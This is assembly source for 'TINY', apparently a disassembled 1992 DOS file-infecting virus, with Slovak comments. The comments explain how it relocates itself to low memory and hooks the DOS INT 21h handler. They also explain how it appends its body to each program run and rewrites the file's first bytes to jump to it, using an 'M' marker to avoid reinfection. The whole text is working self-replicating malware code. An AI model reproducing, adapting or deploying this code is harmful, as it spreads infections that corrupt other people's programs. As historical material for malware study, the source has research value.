

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ									ÛÛ
;ÛÛ	TINY				Extracted:   12-Jun-92		ÛÛ
;ÛÛ							JuUh Soft.	ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

.286c

data_1e		equ	0C8h
data_2e		equ	61Dh
data_3e		equ	61Fh

codea		segment
		assume	cs:codea, ds:codea


		org	100h

tiny		proc	far

start:		jmp	mybody
		dec	bp			;ID  'M'

mybody:		call	getadr

tiny		endp


getadr		proc	near
		pop	si			;ziskat svoju relativ. adresu
		sub	si,3			;zacina vsak o 3 byte vyssie
		push	ax
		mov	ah,0E9h
		int	21h			;fiktivne, zisti ci si v RAM
		mov	di,600h
		xor	cx,cx			;CX = 0
		mov	es,cx			;ES = 0
		mov	cl,0C6h			;0C6h bytes  (198) jeho dlzka
		rep	movsb			;presuva seba na 0:600h
		push	es
		mov	ax,621h			;pokracovat sa bude na 0:621h
		push	ax
		ret				;skok na continue
getadr		endp

savespace:	int	20h			;uschovane prve 4 bytes
		int	20h			;povodneho suboru

continue:	mov	di,84h			;
		mov	cl,2			;ulozi sa offset a potom seg
		mov	ax,656h			;AX = offset
		cld

again:		push	word ptr es:[di]	;offset/seg  INT 21h
		pop	word ptr es:[di+44h]	;odlozeny do vektora INT 32h
		stosw				;a prepisany
		mov	ax,cs			;AX = seg
		loop	again			;zopakovat aj pre segment

		push	word ptr cs:data_2e	;4 bytes zo savespace ulozene
		push	word ptr cs:data_3e	;na stack

recnstr:	mov	di,100h			;prve 4 bytes suboru treba
		pop	word ptr [di+2]		;obnovit ( zo stacku )
		pop	word ptr [di]
		pop	ax
		push	ds			;segment na stack
		push	ds
		pop	es			;obnovenie ES
		push	di			;offset 100h na stack
		ret				;riadenie "cistemu" programu

icall:		push	word ptr [si+1Dh]	;4 bytes zo savespace na
		push	word ptr [si+1Fh]	;stack
		jmp	short recnstr

int21:		cmp	ah,0E9h			;indikacia pritomnosti v RAM
		je	icall			;dotaz ci som uz tu -> ano

		cmp	ax,4B00h		;ma sa spustit subor ?
		jne	useold21		;nie

		push	ax
		push	bx
		push	cx
		push	dx
		push	di
		push	ds
		push	es
		push	cs
		pop	es			;ES = CS

		mov	ax,3D02h		;otvorit subor pre citanie
		int	32h			;vykonane
		jc	error			;nepodarilo sa

		mov	bx,ax			;file handle
		mov	ah,3Fh			;citat
		mov	cx,4			;4 bytes
		mov	dx,61Dh			;do savespace
		mov	di,dx
		push	cs
		pop	ds			;DS = CS
		int	32h			;vykonane
		push	di
		mov	al,4Dh			;testuje sa na ID  'M'
		repne	scasb			;4 bytes v savespace
		pop	di			;obnovenie DI
		jz	isill			;ak ZF, ID bolo najdene

		mov	ax,4202h		;posun na koniec suboru
		xor	cx,cx			;s nulovym posunutim
		xor	dx,dx
		int	32h			;vykonany
		push	ax			;dlzka suboru uschovana
		mov	dh,6			;DX = 0 -> DX = 600h
		mov	cl,0C6h			;cele body
		mov	ah,40h			;zapisat
		int	32h			;vykonane
		mov	ax,4200h		;posun na zaciatok suboru
		xor	cx,cx			;s nulovym posunutim
		xor	dx,dx
		int	32h			;vykonany
		mov	dx,di
		mov	al,0E9h			;instrukcia rel. skoku
		stosb				;ulozena
		pop	ax			;prevzata dlzka suboru
		sub	ax,3			;zmensena o instrukciu skoku
		stosw				;ulozena
		mov	al,4Dh			;4 byte ( jeho ID ? ) 'M'
		stosb				;ulozene
		mov	cl,4			;4 bytes
		mov	ah,40h			;zapisat
		int	32h			;vykonane

isill:		mov	ah,3Eh			;zatvorit subor
		int	32h			;vykonane

error:		pop	es
		pop	ds
		pop	di
		pop	dx
		pop	cx
		pop	bx
		pop	ax

useold21:	jmp	dword ptr cs:data_1e	;vykonanie INT 21h ( -> INT 32h)

codea		ends
		end	start
